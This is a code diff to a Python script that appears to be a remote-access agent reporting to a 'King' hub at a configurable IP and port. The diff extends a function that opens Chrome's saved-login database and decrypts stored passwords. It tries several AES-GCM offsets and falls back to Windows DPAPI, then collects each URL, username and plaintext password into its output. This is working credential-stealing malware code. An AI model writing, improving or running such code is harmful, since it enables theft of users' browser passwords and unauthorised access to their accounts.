@@ -486,15 +486,32 @@ def extract_chrome_credentials():
                     cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                     
                     for url, user, enc_pass in cursor.fetchall():
-                        if not enc_pass or not enc_pass.startswith(b'v10'): continue
+                        if not enc_pass: continue
                         
+                        password = None
                         try:
-                            nonce = enc_pass[3:15]
-                            payload = enc_pass[15:]
-                            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                            # Decrypting with slicing for tag
-                            password = cipher.decrypt(payload[:-16]).decode(errors='ignore')
-                            if password:
+                            # Strategy A: Standard AES-GCM (Try multiple offsets)
+                            # We try offset 3 (v10) and offset 0 (Raw)
+                            for offset in [3, 0]:
+                                try:
+                                    nonce = enc_pass[offset : offset + 12]
+                                    payload = enc_pass[offset + 12:]
+                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                                    # Try decrypting with and without the 16-byte tag
+                                    result = cipher.decrypt(payload[:-16]).decode(errors='ignore')
+                                    if len(result) > 0:
+                                        password = result
+                                        break
+                                except: continue
+                            
+                            # Strategy B: Legacy DPAPI Fallback
+                            if not password:
+                                blob_in = DATA_BLOB(len(enc_pass), ctypes.create_string_buffer(enc_pass))
+                                blob_out = DATA_BLOB()
+                                if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), 0, 0, 0, 0, 0, ctypes.byref(blob_out)):
+                                    password = ctypes.string_at(blob_out.pbData, blob_out.cbData).decode(errors='ignore')
+
+                            if password and len(password.strip()) > 0:
                                 output.append(f"URL: {url}\nUser: {user}\nPass: {password}\n{'-'*20}")
                         except: continue
                     conn.close()
@@ -709,3 +726,4 @@ if __name__ == '__main__':
         print('[*] WARNING: Using default HUB_IP 192.168.100.9. Update --hub-ip if King is on a different machine.')
     print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')
     connect_to_hub(args.hub_ip, args.hub_port)
+
